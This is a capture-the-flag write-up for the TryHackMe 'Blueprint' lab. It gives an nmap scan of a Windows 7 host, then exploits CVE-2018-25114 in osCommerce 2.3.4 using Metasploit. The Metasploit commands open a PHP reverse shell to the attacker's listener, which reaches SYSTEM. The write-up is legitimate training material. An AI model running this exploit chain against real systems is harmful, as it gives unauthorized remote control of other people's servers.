# Target
| Category          | Details                                           |
|-------------------|---------------------------------------------------|
| 📝 **Name**       | [Blueprint](https://tryhackme.com/room/blueprint) |  
| 🏷 **Type**       | THM Challenge                                     |
| 🖥 **OS**         | Windows                                           |
| 🎯 **Difficulty** | Easy                                              |
| 📁 **Tags**       | osCommerce 2.3.4, CVE-2018-25114                  |

# Scan
```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_ssl-date: TLS randomness does not represent time
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-title: Index of /
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-03T20:51:48+00:00
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 0a:b3:85:65:4d:13 (unknown)
| smb2-time: 
|   date: 2025-12-03T20:51:48
|_  start_date: 2025-12-03T20:44:04
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
```

# Attack path
1. [Gain foothold by exploiting CVE-2018-25114 in osCommerce 2.3.4](#gain-foothold-by-exploiting-cve-2018-25114-in-oscommerce-234)

### Gain foothold by exploiting [CVE-2018-25114](https://nvd.nist.gov/vuln/detail/CVE-2018-25114) in osCommerce 2.3.4

#### Discover osCommerce 2.3.4 running on target
```
┌──(magicrc㉿perun)-[~/attack/THM Blueprint]
└─$ curl -s 10.82.149.21:8080/oscommerce-2.3.4/catalog/install/ | grep "Welcome to osCommerce Online Merchant"
  <h1>Welcome to osCommerce Online Merchant v2.3.4!</h1>
```
Application has been discovered using manual web browsing.

#### Run `exploit/multi/http/oscommerce_installer_unauth_code_exec` to exploit [CVE-2018-25114](https://nvd.nist.gov/vuln/detail/CVE-2018-25114)
Using `payload/php/reverse_php` as `php/meterpreter/reverse_tcp` has stability issues.
```
┌──(magicrc㉿perun)-[~/attack/THM Blueprint]
└─$ msfconsole -q
msf > use exploit/multi/http/oscommerce_installer_unauth_code_exec
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > set RHOST 10.82.149.21
RHOST => 10.82.149.21
msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > set RPORT 8080
RPORT => 8080
msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > set URI /oscommerce-2.3.4/catalog/install/
URI => /oscommerce-2.3.4/catalog/install/
msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > set LHOST tun0
LHOST => tun0
msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > set PAYLOAD payload/php/reverse_php
PAYLOAD => php/reverse_php
msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > run
[*] Started reverse TCP handler on 192.168.132.170:4444 
[*] Command shell session 1 opened (192.168.132.170:4444 -> 10.82.149.21:49253) at 2025-12-04 10:57:00 +0100

whoami
nt authority\system
```
It seems that application is running as `Administrator` user and thus no further escalation is needed.